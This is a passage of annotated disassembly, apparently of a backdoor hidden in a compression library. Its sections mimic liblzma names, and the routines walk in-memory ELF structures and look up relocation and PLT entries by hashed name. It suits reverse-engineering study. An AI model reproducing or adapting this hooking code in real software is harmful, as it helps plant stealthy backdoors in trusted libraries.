.text.crc64_generia:0000000000001B5E                 add     rcx, 1
.text.crc64_generia:0000000000001B62                 cmp     rdx, rcx
.text.crc64_generia:0000000000001B65                 jnz     short loc_1B56
.text.crc64_generia:0000000000001B67
.text.crc64_generia:0000000000001B67 locret_1B67:                            ; CODE XREF: sub_1B20+18↑j
.text.crc64_generia:0000000000001B67                 retn
.text.crc64_generia:0000000000001B68 ; ---------------------------------------------------------------------------
.text.crc64_generia:0000000000001B68
.text.crc64_generia:0000000000001B68 locret_1B68:                            ; CODE XREF: sub_1B20+34↑j
.text.crc64_generia:0000000000001B68                 retn
.text.crc64_generia:0000000000001B68 sub_1B20        endp
.text.crc64_generia:0000000000001B68
.text.crc64_generia:0000000000001B68 _text_crc64_generia ends
.text.crc64_generia:0000000000001B68
.text.init_pric_tabla:0000000000001B70 ; ===========================================================================
.text.init_pric_tabla:0000000000001B70
.text.init_pric_tabla:0000000000001B70 ; Segment type: Pure code
.text.init_pric_tabla:0000000000001B70 ; Segment permissions: Read/Execute
.text.init_pric_tabla:0000000000001B70 _text_init_pric_tabla segment para public 'CODE' use64
.text.init_pric_tabla:0000000000001B70                 assume cs:_text_init_pric_tabla
.text.init_pric_tabla:0000000000001B70                 ;org 1B70h
.text.init_pric_tabla:0000000000001B70                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.init_pric_tabla:0000000000001B70
.text.init_pric_tabla:0000000000001B70 ; =============== S U B R O U T I N E =======================================
.text.init_pric_tabla:0000000000001B70
.text.init_pric_tabla:0000000000001B70
.text.init_pric_tabla:0000000000001B70 ; unsigned int *__fastcall Linit_pric_table_part_1(struct_elf_info *a1, __int64 a2, int a3)
.text.init_pric_tabla:0000000000001B70 _Linit_pric_table_part_1 proc near      ; DATA XREF: .data.rel.ro.decoders0:data_lzma_allocator↓o
.text.init_pric_tabla:0000000000001B70                 endbr64
.text.init_pric_tabla:0000000000001B74                 mov     esi, edx
.text.init_pric_tabla:0000000000001B76                 jmp     import_lookup_ex ; PIC mode
.text.init_pric_tabla:0000000000001B76 _Linit_pric_table_part_1 endp
.text.init_pric_tabla:0000000000001B76
.text.init_pric_tabla:0000000000001B76 _text_init_pric_tabla ends
.text.init_pric_tabla:0000000000001B76
.text.stream_encoder_updata:0000000000001B80 ; ===========================================================================
.text.stream_encoder_updata:0000000000001B80
.text.stream_encoder_updata:0000000000001B80 ; Segment type: Pure code
.text.stream_encoder_updata:0000000000001B80 ; Segment permissions: Read/Execute
.text.stream_encoder_updata:0000000000001B80 _text_stream_encoder_updata segment para public 'CODE' use64
.text.stream_encoder_updata:0000000000001B80                 assume cs:_text_stream_encoder_updata
.text.stream_encoder_updata:0000000000001B80                 ;org 1B80h
.text.stream_encoder_updata:0000000000001B80                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.stream_encoder_updata:0000000000001B80
.text.stream_encoder_updata:0000000000001B80 ; =============== S U B R O U T I N E =======================================
.text.stream_encoder_updata:0000000000001B80
.text.stream_encoder_updata:0000000000001B80
.text.stream_encoder_updata:0000000000001B80 ; unsigned __int64 __fastcall Lstream_encoder_update_0(__int64 *, __int64, unsigned __int64, unsigned __int64, unsigned __int64 *)
.text.stream_encoder_updata:0000000000001B80 _Lstream_encoder_update_0 proc near     ; CODE XREF: sub_2A40+3E↓p
.text.stream_encoder_updata:0000000000001B80                                         ; sub_2D20+224↓p ...
.text.stream_encoder_updata:0000000000001B80                 endbr64
.text.stream_encoder_updata:0000000000001B84                 test    byte ptr [rdi+0D0h], 2
.text.stream_encoder_updata:0000000000001B8B                 jz      loc_1C17
.text.stream_encoder_updata:0000000000001B91                 mov     eax, [rdi+80h]
.text.stream_encoder_updata:0000000000001B97                 test    eax, eax
.text.stream_encoder_updata:0000000000001B99                 jz      short loc_1C17
.text.stream_encoder_updata:0000000000001B9B                 push    r12
.text.stream_encoder_updata:0000000000001B9D                 mov     r10, rdx
.text.stream_encoder_updata:0000000000001BA0                 mov     r9, rsi
.text.stream_encoder_updata:0000000000001BA3                 xor     edx, edx
.text.stream_encoder_updata:0000000000001BA5                 push    rbx
.text.stream_encoder_updata:0000000000001BA6                 mov     rbx, rcx
.text.stream_encoder_updata:0000000000001BA9                 test    r8, r8
.text.stream_encoder_updata:0000000000001BAC                 jz      short loc_1BB1
.text.stream_encoder_updata:0000000000001BAE                 mov     rdx, [r8]
.text.stream_encoder_updata:0000000000001BB1
.text.stream_encoder_updata:0000000000001BB1 loc_1BB1:                               ; CODE XREF: _Lstream_encoder_update_0+2C↑j
.text.stream_encoder_updata:0000000000001BB1                 mov     r11, [rdi]
.text.stream_encoder_updata:0000000000001BB4                 mov     r12, r9
.text.stream_encoder_updata:0000000000001BB7                 mov     esi, eax
.text.stream_encoder_updata:0000000000001BB9                 sub     r12, r11
.text.stream_encoder_updata:0000000000001BBC
.text.stream_encoder_updata:0000000000001BBC loc_1BBC:                               ; CODE XREF: _Lstream_encoder_update_0+7A↓j
.text.stream_encoder_updata:0000000000001BBC                 cmp     rdx, rsi
.text.stream_encoder_updata:0000000000001BBF                 jnb     short loc_1BFC
.text.stream_encoder_updata:0000000000001BC1                 imul    rcx, rdx, 18h
.text.stream_encoder_updata:0000000000001BC5                 add     rcx, [rdi+78h]
.text.stream_encoder_updata:0000000000001BC9                 cmp     dword ptr [rcx+8], 8
.text.stream_encoder_updata:0000000000001BCD                 jnz     short loc_1BF7
.text.stream_encoder_updata:0000000000001BCF                 mov     rax, [rcx+10h]
.text.stream_encoder_updata:0000000000001BD3                 test    r9, r9
.text.stream_encoder_updata:0000000000001BD6                 jnz     short loc_1BDD
.text.stream_encoder_updata:0000000000001BD8                 add     rax, r11
.text.stream_encoder_updata:0000000000001BDB                 jmp     short loc_1BED
.text.stream_encoder_updata:0000000000001BDD ; ---------------------------------------------------------------------------
.text.stream_encoder_updata:0000000000001BDD
.text.stream_encoder_updata:0000000000001BDD loc_1BDD:                               ; CODE XREF: _Lstream_encoder_update_0+56↑j
.text.stream_encoder_updata:0000000000001BDD                 cmp     rax, r12
.text.stream_encoder_updata:0000000000001BE0                 jnz     short loc_1BF7
.text.stream_encoder_updata:0000000000001BE2                 mov     rax, [rcx]
.text.stream_encoder_updata:0000000000001BE5                 add     rax, r11
.text.stream_encoder_updata:0000000000001BE8                 test    r10, r10
.text.stream_encoder_updata:0000000000001BEB                 jz      short loc_1C08
.text.stream_encoder_updata:0000000000001BED
.text.stream_encoder_updata:0000000000001BED loc_1BED:                               ; CODE XREF: _Lstream_encoder_update_0+5B↑j
.text.stream_encoder_updata:0000000000001BED                 cmp     rax, r10
.text.stream_encoder_updata:0000000000001BF0                 jb      short loc_1BF7
.text.stream_encoder_updata:0000000000001BF2                 cmp     rbx, rax
.text.stream_encoder_updata:0000000000001BF5                 jnb     short loc_1C08
.text.stream_encoder_updata:0000000000001BF7
.text.stream_encoder_updata:0000000000001BF7 loc_1BF7:                               ; CODE XREF: _Lstream_encoder_update_0+4D↑j
.text.stream_encoder_updata:0000000000001BF7                                         ; _Lstream_encoder_update_0+60↑j ...
.text.stream_encoder_updata:0000000000001BF7                 inc     rdx
.text.stream_encoder_updata:0000000000001BFA                 jmp     short loc_1BBC
.text.stream_encoder_updata:0000000000001BFC ; ---------------------------------------------------------------------------
.text.stream_encoder_updata:0000000000001BFC
.text.stream_encoder_updata:0000000000001BFC loc_1BFC:                               ; CODE XREF: _Lstream_encoder_update_0+3F↑j
.text.stream_encoder_updata:0000000000001BFC                 test    r8, r8
.text.stream_encoder_updata:0000000000001BFF                 jz      short loc_1C04
.text.stream_encoder_updata:0000000000001C01                 mov     [r8], rdx
.text.stream_encoder_updata:0000000000001C04
.text.stream_encoder_updata:0000000000001C04 loc_1C04:                               ; CODE XREF: _Lstream_encoder_update_0+7F↑j
.text.stream_encoder_updata:0000000000001C04                 xor     eax, eax
.text.stream_encoder_updata:0000000000001C06                 jmp     short loc_1C13
.text.stream_encoder_updata:0000000000001C08 ; ---------------------------------------------------------------------------
.text.stream_encoder_updata:0000000000001C08
.text.stream_encoder_updata:0000000000001C08 loc_1C08:                               ; CODE XREF: _Lstream_encoder_update_0+6B↑j
.text.stream_encoder_updata:0000000000001C08                                         ; _Lstream_encoder_update_0+75↑j
.text.stream_encoder_updata:0000000000001C08                 test    r8, r8
.text.stream_encoder_updata:0000000000001C0B                 jz      short loc_1C13
.text.stream_encoder_updata:0000000000001C0D                 inc     rdx
.text.stream_encoder_updata:0000000000001C10                 mov     [r8], rdx
.text.stream_encoder_updata:0000000000001C13
.text.stream_encoder_updata:0000000000001C13 loc_1C13:                               ; CODE XREF: _Lstream_encoder_update_0+86↑j
.text.stream_encoder_updata:0000000000001C13                                         ; _Lstream_encoder_update_0+8B↑j
.text.stream_encoder_updata:0000000000001C13                 pop     rbx
.text.stream_encoder_updata:0000000000001C14                 pop     r12
.text.stream_encoder_updata:0000000000001C16                 retn
.text.stream_encoder_updata:0000000000001C17 ; ---------------------------------------------------------------------------
.text.stream_encoder_updata:0000000000001C17
.text.stream_encoder_updata:0000000000001C17 loc_1C17:                               ; CODE XREF: _Lstream_encoder_update_0+B↑j
.text.stream_encoder_updata:0000000000001C17                                         ; _Lstream_encoder_update_0+19↑j
.text.stream_encoder_updata:0000000000001C17                 xor     eax, eax
.text.stream_encoder_updata:0000000000001C19                 retn
.text.stream_encoder_updata:0000000000001C19 _Lstream_encoder_update_0 endp
.text.stream_encoder_updata:0000000000001C19
.text.stream_encoder_updata:0000000000001C19 _text_stream_encoder_updata ends
.text.stream_encoder_updata:0000000000001C19
.text.stream_encoder_updatz:0000000000001C20 ; ===========================================================================
.text.stream_encoder_updatz:0000000000001C20
.text.stream_encoder_updatz:0000000000001C20 ; Segment type: Pure code
.text.stream_encoder_updatz:0000000000001C20 ; Segment permissions: Read/Execute
.text.stream_encoder_updatz:0000000000001C20 _text_stream_encoder_updatz segment para public 'CODE' use64
.text.stream_encoder_updatz:0000000000001C20                 assume cs:_text_stream_encoder_updatz
.text.stream_encoder_updatz:0000000000001C20                 ;org 1C20h
.text.stream_encoder_updatz:0000000000001C20                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.stream_encoder_updatz:0000000000001C20
.text.stream_encoder_updatz:0000000000001C20 ; =============== S U B R O U T I N E =======================================
.text.stream_encoder_updatz:0000000000001C20
.text.stream_encoder_updatz:0000000000001C20
.text.stream_encoder_updatz:0000000000001C20 ; unsigned __int8 *__fastcall Lstream_encoder_update_1(struct_elf_info *, __int64, unsigned __int64, unsigned __int64, unsigned __int64 *)
.text.stream_encoder_updatz:0000000000001C20 _Lstream_encoder_update_1 proc near     ; CODE XREF: sub_2A40+7B↓p
.text.stream_encoder_updatz:0000000000001C20                                         ; parse_elf_init+AF2↓p ...
.text.stream_encoder_updatz:0000000000001C20
.text.stream_encoder_updatz:0000000000001C20 var_60          = qword ptr -60h
.text.stream_encoder_updatz:0000000000001C20 var_58          = qword ptr -58h
.text.stream_encoder_updatz:0000000000001C20 var_50          = qword ptr -50h
.text.stream_encoder_updatz:0000000000001C20 var_48          = qword ptr -48h
.text.stream_encoder_updatz:0000000000001C20 var_40          = qword ptr -40h
.text.stream_encoder_updatz:0000000000001C20 var_38          = qword ptr -38h
.text.stream_encoder_updatz:0000000000001C20 var_30          = qword ptr -30h
.text.stream_encoder_updatz:0000000000001C20
.text.stream_encoder_updatz:0000000000001C20                 endbr64
.text.stream_encoder_updatz:0000000000001C24                 push    r15
.text.stream_encoder_updatz:0000000000001C26                 push    r14
.text.stream_encoder_updatz:0000000000001C28                 push    r13
.text.stream_encoder_updatz:0000000000001C2A                 push    r12
.text.stream_encoder_updatz:0000000000001C2C                 push    rbx
.text.stream_encoder_updatz:0000000000001C2D                 sub     rsp, 40h
.text.stream_encoder_updatz:0000000000001C31                 mov     r15, [rdi]
.text.stream_encoder_updatz:0000000000001C34                 mov     [rsp+68h+var_58], rcx
.text.stream_encoder_updatz:0000000000001C39                 test    byte ptr [rdi+0D0h], 4
.text.stream_encoder_updatz:0000000000001C40                 jz      loc_1D83
.text.stream_encoder_updatz:0000000000001C46                 mov     eax, [rdi+90h]
.text.stream_encoder_updatz:0000000000001C4C                 mov     r14, rsi
.text.stream_encoder_updatz:0000000000001C4F                 test    rsi, rsi
.text.stream_encoder_updatz:0000000000001C52                 jz      loc_1D83
.text.stream_encoder_updatz:0000000000001C58                 test    eax, eax
.text.stream_encoder_updatz:0000000000001C5A                 jz      loc_1D83
.text.stream_encoder_updatz:0000000000001C60                 mov     r9, rdx
.text.stream_encoder_updatz:0000000000001C63                 mov     r12, r8
.text.stream_encoder_updatz:0000000000001C66                 xor     ebx, ebx
.text.stream_encoder_updatz:0000000000001C68                 test    r8, r8
.text.stream_encoder_updatz:0000000000001C6B                 jz      short loc_1C70
.text.stream_encoder_updatz:0000000000001C6D                 mov     rbx, [r8]
.text.stream_encoder_updatz:0000000000001C70
.text.stream_encoder_updatz:0000000000001C70 loc_1C70:                               ; CODE XREF: _Lstream_encoder_update_1+4B↑j
.text.stream_encoder_updatz:0000000000001C70                 sub     r14, r15
.text.stream_encoder_updatz:0000000000001C73                 mov     [rsp+68h+var_50], rax
.text.stream_encoder_updatz:0000000000001C78                 xor     r10d, r10d
.text.stream_encoder_updatz:0000000000001C7B                 mov     [rsp+68h+var_60], r14
.text.stream_encoder_updatz:0000000000001C80
.text.stream_encoder_updatz:0000000000001C80 loc_1C80:                               ; CODE XREF: _Lstream_encoder_update_1+155↓j
.text.stream_encoder_updatz:0000000000001C80                 mov     rax, [rsp+68h+var_50]
.text.stream_encoder_updatz:0000000000001C85                 cmp     rbx, rax
.text.stream_encoder_updatz:0000000000001C88                 jnb     loc_1D7A
.text.stream_encoder_updatz:0000000000001C8E                 mov     rax, [rdi+88h]
.text.stream_encoder_updatz:0000000000001C95                 lea     rsi, [r15+r10]
.text.stream_encoder_updatz:0000000000001C99                 mov     r14, [rax+rbx*8]
.text.stream_encoder_updatz:0000000000001C9D                 test    r14b, 1
.text.stream_encoder_updatz:0000000000001CA1                 jnz     short loc_1D09
.text.stream_encoder_updatz:0000000000001CA3                 lea     r13, [r15+r14]
.text.stream_encoder_updatz:0000000000001CA7                 mov     ecx, 4
.text.stream_encoder_updatz:0000000000001CAC                 mov     edx, 8
.text.stream_encoder_updatz:0000000000001CB1                 mov     [rsp+68h+var_40], r9
.text.stream_encoder_updatz:0000000000001CB6                 mov     rsi, r13
.text.stream_encoder_updatz:0000000000001CB9                 mov     [rsp+68h+var_48], rdi
.text.stream_encoder_updatz:0000000000001CBE                 call    process_elf_seg ; PIC mode
.text.stream_encoder_updatz:0000000000001CC3                 test    eax, eax
.text.stream_encoder_updatz:0000000000001CC5                 jz      loc_1D83
.text.stream_encoder_updatz:0000000000001CCB                 mov     rax, [rsp+68h+var_60]
.text.stream_encoder_updatz:0000000000001CD0                 cmp     [r13+0], rax
.text.stream_encoder_updatz:0000000000001CD4                 mov     rdi, [rsp+68h+var_48]
.text.stream_encoder_updatz:0000000000001CD9                 mov     r9, [rsp+68h+var_40]
.text.stream_encoder_updatz:0000000000001CDE                 jnz     short loc_1CF9
.text.stream_encoder_updatz:0000000000001CE0                 test    r9, r9
.text.stream_encoder_updatz:0000000000001CE3                 jz      loc_1D88
.text.stream_encoder_updatz:0000000000001CE9                 cmp     r13, r9
.text.stream_encoder_updatz:0000000000001CEC                 jb      short loc_1CF9
.text.stream_encoder_updatz:0000000000001CEE                 cmp     [rsp+68h+var_58], r13
.text.stream_encoder_updatz:0000000000001CF3                 jnb     loc_1D88
.text.stream_encoder_updatz:0000000000001CF9
.text.stream_encoder_updatz:0000000000001CF9 loc_1CF9:                               ; CODE XREF: _Lstream_encoder_update_1+BE↑j
.text.stream_encoder_updatz:0000000000001CF9                                         ; _Lstream_encoder_update_1+CC↑j
.text.stream_encoder_updatz:0000000000001CF9                 lea     r10, [r14+8]
.text.stream_encoder_updatz:0000000000001CFD                 jmp     short loc_1D72
.text.stream_encoder_updatz:0000000000001CFF ; ---------------------------------------------------------------------------
.text.stream_encoder_updatz:0000000000001CFF
.text.stream_encoder_updatz:0000000000001CFF loc_1CFF:                               ; CODE XREF: _Lstream_encoder_update_1+EC↓j
.text.stream_encoder_updatz:0000000000001CFF                 test    r14b, 1
.text.stream_encoder_updatz:0000000000001D03                 jnz     short loc_1D10
.text.stream_encoder_updatz:0000000000001D05
.text.stream_encoder_updatz:0000000000001D05 loc_1D05:                               ; CODE XREF: _Lstream_encoder_update_1+136↓j
.text.stream_encoder_updatz:0000000000001D05                                         ; _Lstream_encoder_update_1+140↓j ...
.text.stream_encoder_updatz:0000000000001D05                 add     rsi, 8
.text.stream_encoder_updatz:0000000000001D09
.text.stream_encoder_updatz:0000000000001D09 loc_1D09:                               ; CODE XREF: _Lstream_encoder_update_1+81↑j
.text.stream_encoder_updatz:0000000000001D09                 shr     r14, 1
.text.stream_encoder_updatz:0000000000001D0C                 jnz     short loc_1CFF
.text.stream_encoder_updatz:0000000000001D0E                 jmp     short loc_1D6B
.text.stream_encoder_updatz:0000000000001D10 ; ---------------------------------------------------------------------------
.text.stream_encoder_updatz:0000000000001D10
.text.stream_encoder_updatz:0000000000001D10 loc_1D10:                               ; CODE XREF: _Lstream_encoder_update_1+E3↑j
.text.stream_encoder_updatz:0000000000001D10                 mov     ecx, 4
.text.stream_encoder_updatz:0000000000001D15                 mov     edx, 8
.text.stream_encoder_updatz:0000000000001D1A                 mov     [rsp+68h+var_30], r9
.text.stream_encoder_updatz:0000000000001D1F                 mov     r13, rsi
.text.stream_encoder_updatz:0000000000001D22                 mov     [rsp+68h+var_38], r10
.text.stream_encoder_updatz:0000000000001D27                 mov     [rsp+68h+var_40], rsi
.text.stream_encoder_updatz:0000000000001D2C                 mov     [rsp+68h+var_48], rdi
.text.stream_encoder_updatz:0000000000001D31                 call    process_elf_seg ; PIC mode
.text.stream_encoder_updatz:0000000000001D36                 test    eax, eax
.text.stream_encoder_updatz:0000000000001D38                 jz      short loc_1D83
.text.stream_encoder_updatz:0000000000001D3A                 mov     rsi, [rsp+68h+var_40]
.text.stream_encoder_updatz:0000000000001D3F                 mov     rax, [rsp+68h+var_60]
.text.stream_encoder_updatz:0000000000001D44                 mov     rdi, [rsp+68h+var_48]
.text.stream_encoder_updatz:0000000000001D49                 mov     r10, [rsp+68h+var_38]
.text.stream_encoder_updatz:0000000000001D4E                 cmp     [rsi], rax
.text.stream_encoder_updatz:0000000000001D51                 mov     r9, [rsp+68h+var_30]
.text.stream_encoder_updatz:0000000000001D56                 jnz     short loc_1D05
.text.stream_encoder_updatz:0000000000001D58                 test    r9, r9
.text.stream_encoder_updatz:0000000000001D5B                 jz      short loc_1D88
.text.stream_encoder_updatz:0000000000001D5D                 cmp     r9, rsi
.text.stream_encoder_updatz:0000000000001D60                 ja      short loc_1D05
.text.stream_encoder_updatz:0000000000001D62                 cmp     [rsp+68h+var_58], rsi
.text.stream_encoder_updatz:0000000000001D67                 jb      short loc_1D05
.text.stream_encoder_updatz:0000000000001D69                 jmp     short loc_1D88
.text.stream_encoder_updatz:0000000000001D6B ; ---------------------------------------------------------------------------
.text.stream_encoder_updatz:0000000000001D6B
.text.stream_encoder_updatz:0000000000001D6B loc_1D6B:                               ; CODE XREF: _Lstream_encoder_update_1+EE↑j
.text.stream_encoder_updatz:0000000000001D6B                 add     r10, 1F8h
.text.stream_encoder_updatz:0000000000001D72
.text.stream_encoder_updatz:0000000000001D72 loc_1D72:                               ; CODE XREF: _Lstream_encoder_update_1+DD↑j
.text.stream_encoder_updatz:0000000000001D72                 inc     rbx
.text.stream_encoder_updatz:0000000000001D75                 jmp     loc_1C80
.text.stream_encoder_updatz:0000000000001D7A ; ---------------------------------------------------------------------------
.text.stream_encoder_updatz:0000000000001D7A
.text.stream_encoder_updatz:0000000000001D7A loc_1D7A:                               ; CODE XREF: _Lstream_encoder_update_1+68↑j
.text.stream_encoder_updatz:0000000000001D7A                 test    r12, r12
.text.stream_encoder_updatz:0000000000001D7D                 jz      short loc_1D83
.text.stream_encoder_updatz:0000000000001D7F                 mov     [r12], rbx
.text.stream_encoder_updatz:0000000000001D83
.text.stream_encoder_updatz:0000000000001D83 loc_1D83:                               ; CODE XREF: _Lstream_encoder_update_1+20↑j
.text.stream_encoder_updatz:0000000000001D83                                         ; _Lstream_encoder_update_1+32↑j ...
.text.stream_encoder_updatz:0000000000001D83                 xor     r13d, r13d
.text.stream_encoder_updatz:0000000000001D86                 jmp     short loc_1D94
.text.stream_encoder_updatz:0000000000001D88 ; ---------------------------------------------------------------------------
.text.stream_encoder_updatz:0000000000001D88
.text.stream_encoder_updatz:0000000000001D88 loc_1D88:                               ; CODE XREF: _Lstream_encoder_update_1+C3↑j
.text.stream_encoder_updatz:0000000000001D88                                         ; _Lstream_encoder_update_1+D3↑j ...
.text.stream_encoder_updatz:0000000000001D88                 test    r12, r12
.text.stream_encoder_updatz:0000000000001D8B                 jz      short loc_1D94
.text.stream_encoder_updatz:0000000000001D8D                 inc     rbx
.text.stream_encoder_updatz:0000000000001D90                 mov     [r12], rbx
.text.stream_encoder_updatz:0000000000001D94
.text.stream_encoder_updatz:0000000000001D94 loc_1D94:                               ; CODE XREF: _Lstream_encoder_update_1+166↑j
.text.stream_encoder_updatz:0000000000001D94                                         ; _Lstream_encoder_update_1+16B↑j
.text.stream_encoder_updatz:0000000000001D94                 add     rsp, 40h
.text.stream_encoder_updatz:0000000000001D98                 mov     rax, r13
.text.stream_encoder_updatz:0000000000001D9B                 pop     rbx
.text.stream_encoder_updatz:0000000000001D9C                 pop     r12
.text.stream_encoder_updatz:0000000000001D9E                 pop     r13
.text.stream_encoder_updatz:0000000000001DA0                 pop     r14
.text.stream_encoder_updatz:0000000000001DA2                 pop     r15
.text.stream_encoder_updatz:0000000000001DA4                 retn
.text.stream_encoder_updatz:0000000000001DA4 _Lstream_encoder_update_1 endp
.text.stream_encoder_updatz:0000000000001DA4
.text.stream_encoder_updatz:0000000000001DA4 _text_stream_encoder_updatz ends
.text.stream_encoder_updatz:0000000000001DA4
.text.lz_encoda:0000000000001DB0 ; ===========================================================================
.text.lz_encoda:0000000000001DB0
.text.lz_encoda:0000000000001DB0 ; Segment type: Pure code
.text.lz_encoda:0000000000001DB0 ; Segment permissions: Read/Execute
.text.lz_encoda:0000000000001DB0 _text_lz_encoda segment para public 'CODE' use64
.text.lz_encoda:0000000000001DB0                 assume cs:_text_lz_encoda
.text.lz_encoda:0000000000001DB0                 ;org 1DB0h
.text.lz_encoda:0000000000001DB0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lz_encoda:0000000000001DB0
.text.lz_encoda:0000000000001DB0 ; =============== S U B R O U T I N E =======================================
.text.lz_encoda:0000000000001DB0
.text.lz_encoda:0000000000001DB0
.text.lz_encoda:0000000000001DB0 ; __int64 __fastcall Llz_encode_1(struct_elf_info *a1, _QWORD *JMPREL_addr, unsigned int plt_num, __int64 a4, int tre_hash)
.text.lz_encoda:0000000000001DB0 _Llz_encode_1   proc near               ; CODE XREF: _Ldelta_coder_end_1+20↓j
.text.lz_encoda:0000000000001DB0                                         ; _Ldelta_decode_part_0+23↓j
.text.lz_encoda:0000000000001DB0
.text.lz_encoda:0000000000001DB0 var_30          = qword ptr -30h
.text.lz_encoda:0000000000001DB0
.text.lz_encoda:0000000000001DB0                 endbr64
.text.lz_encoda:0000000000001DB4                 push    r15
.text.lz_encoda:0000000000001DB6                 mov     r15d, edx
.text.lz_encoda:0000000000001DB9                 mov     edx, 5
.text.lz_encoda:0000000000001DBE                 push    r14
.text.lz_encoda:0000000000001DC0                 mov     r14, rdi
.text.lz_encoda:0000000000001DC3                 xor     edi, edi
.text.lz_encoda:0000000000001DC5                 push    r13
.text.lz_encoda:0000000000001DC7                 mov     r13, rsi
.text.lz_encoda:0000000000001DCA                 mov     esi, 67h ; 'g'
.text.lz_encoda:0000000000001DCF                 push    r12
.text.lz_encoda:0000000000001DD1                 mov     r12d, r8d
.text.lz_encoda:0000000000001DD4                 push    rbx
.text.lz_encoda:0000000000001DD5                 mov     rbx, rcx
.text.lz_encoda:0000000000001DD8                 mov     ecx, 4
.text.lz_encoda:0000000000001DDD                 sub     rsp, 10h
.text.lz_encoda:0000000000001DE1                 call    apply_one_entry_ex ; PIC mode
.text.lz_encoda:0000000000001DE6                 xor     edx, edx
.text.lz_encoda:0000000000001DE8                 test    eax, eax
.text.lz_encoda:0000000000001DEA                 jnz     short loc_1E02
.text.lz_encoda:0000000000001DEC
.text.lz_encoda:0000000000001DEC loc_1DEC:                               ; CODE XREF: _Llz_encode_1+57↓j
.text.lz_encoda:0000000000001DEC                 xor     eax, eax
.text.lz_encoda:0000000000001DEE                 jmp     short loc_1E3F
.text.lz_encoda:0000000000001DF0 ; ---------------------------------------------------------------------------
.text.lz_encoda:0000000000001DF0
.text.lz_encoda:0000000000001DF0 loc_1DF0:                               ; CODE XREF: _Llz_encode_1+55↓j
.text.lz_encoda:0000000000001DF0                 mov     rax, [r13+8]
.text.lz_encoda:0000000000001DF4                 mov     ecx, eax
.text.lz_encoda:0000000000001DF6                 cmp     rcx, rbx
.text.lz_encoda:0000000000001DF9                 jz      short loc_1E09
.text.lz_encoda:0000000000001DFB
.text.lz_encoda:0000000000001DFB loc_1DFB:                               ; CODE XREF: _Llz_encode_1+6A↓j
.text.lz_encoda:0000000000001DFB                                         ; _Llz_encode_1+86↓j
.text.lz_encoda:0000000000001DFB                 inc     rdx
.text.lz_encoda:0000000000001DFE                 add     r13, 18h
.text.lz_encoda:0000000000001E02
.text.lz_encoda:0000000000001E02 loc_1E02:                               ; CODE XREF: _Llz_encode_1+3A↑j
.text.lz_encoda:0000000000001E02                 cmp     rdx, r15
.text.lz_encoda:0000000000001E05                 jb      short loc_1DF0
.text.lz_encoda:0000000000001E07                 jmp     short loc_1DEC
.text.lz_encoda:0000000000001E09 ; ---------------------------------------------------------------------------
.text.lz_encoda:0000000000001E09
.text.lz_encoda:0000000000001E09 loc_1E09:                               ; CODE XREF: _Llz_encode_1+49↑j
.text.lz_encoda:0000000000001E09                 shr     rax, 20h
.text.lz_encoda:0000000000001E0D                 imul    rax, 18h
.text.lz_encoda:0000000000001E11                 add     rax, [r14+38h]
.text.lz_encoda:0000000000001E15                 cmp     word ptr [rax+6], 0
.text.lz_encoda:0000000000001E1A                 jnz     short loc_1DFB
.text.lz_encoda:0000000000001E1C                 mov     edi, [rax]
.text.lz_encoda:0000000000001E1E                 xor     esi, esi        ; unsigned __int64
.text.lz_encoda:0000000000001E20                 add     rdi, [r14+30h]  ; _BYTE *
.text.lz_encoda:0000000000001E24                 mov     [rsp+38h+var_30], rdx
.text.lz_encoda:0000000000001E29                 call    table_get       ; PIC mode
.text.lz_encoda:0000000000001E2E                 mov     rdx, [rsp+38h+var_30]
.text.lz_encoda:0000000000001E33                 cmp     eax, r12d
.text.lz_encoda:0000000000001E36                 jnz     short loc_1DFB
.text.lz_encoda:0000000000001E38                 mov     rax, [r13+0]
.text.lz_encoda:0000000000001E3C                 add     rax, [r14]
.text.lz_encoda:0000000000001E3F
.text.lz_encoda:0000000000001E3F loc_1E3F:                               ; CODE XREF: _Llz_encode_1+3E↑j
.text.lz_encoda:0000000000001E3F                 add     rsp, 10h
.text.lz_encoda:0000000000001E43                 pop     rbx
.text.lz_encoda:0000000000001E44                 pop     r12
.text.lz_encoda:0000000000001E46                 pop     r13
.text.lz_encoda:0000000000001E48                 pop     r14
.text.lz_encoda:0000000000001E4A                 pop     r15
.text.lz_encoda:0000000000001E4C                 retn
.text.lz_encoda:0000000000001E4C _Llz_encode_1   endp
.text.lz_encoda:0000000000001E4C
.text.lz_encoda:0000000000001E4C _text_lz_encoda ends
.text.lz_encoda:0000000000001E4C
.text.delta_coder_ena:0000000000001E50 ; ===========================================================================
.text.delta_coder_ena:0000000000001E50
.text.delta_coder_ena:0000000000001E50 ; Segment type: Pure code
.text.delta_coder_ena:0000000000001E50 ; Segment permissions: Read/Execute
.text.delta_coder_ena:0000000000001E50 _text_delta_coder_ena segment para public 'CODE' use64
.text.delta_coder_ena:0000000000001E50                 assume cs:_text_delta_coder_ena
.text.delta_coder_ena:0000000000001E50                 ;org 1E50h
.text.delta_coder_ena:0000000000001E50                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.delta_coder_ena:0000000000001E50
.text.delta_coder_ena:0000000000001E50 ; =============== S U B R O U T I N E =======================================
.text.delta_coder_ena:0000000000001E50
.text.delta_coder_ena:0000000000001E50
.text.delta_coder_ena:0000000000001E50 ; __int64 __fastcall Ldelta_coder_end_1(struct_elf_info *a1, int tre_hash)
.text.delta_coder_ena:0000000000001E50 _Ldelta_coder_end_1 proc near           ; CODE XREF: process_shared_libraries_map+276↓p
.text.delta_coder_ena:0000000000001E50                                         ; process_shared_libraries_map+28E↓p ...
.text.delta_coder_ena:0000000000001E50                 endbr64
.text.delta_coder_ena:0000000000001E54                 mov     r8d, esi
.text.delta_coder_ena:0000000000001E57                 test    byte ptr [rdi+0D0h], 1
.text.delta_coder_ena:0000000000001E5E                 jz      short loc_1E75
.text.delta_coder_ena:0000000000001E60                 mov     edx, [rdi+48h]
.text.delta_coder_ena:0000000000001E63                 test    edx, edx
.text.delta_coder_ena:0000000000001E65                 jz      short loc_1E75
.text.delta_coder_ena:0000000000001E67                 mov     rsi, [rdi+40h]
.text.delta_coder_ena:0000000000001E6B                 mov     ecx, 7
.text.delta_coder_ena:0000000000001E70                 jmp     _Llz_encode_1   ; PIC mode
.text.delta_coder_ena:0000000000001E75 ; ---------------------------------------------------------------------------
.text.delta_coder_ena:0000000000001E75
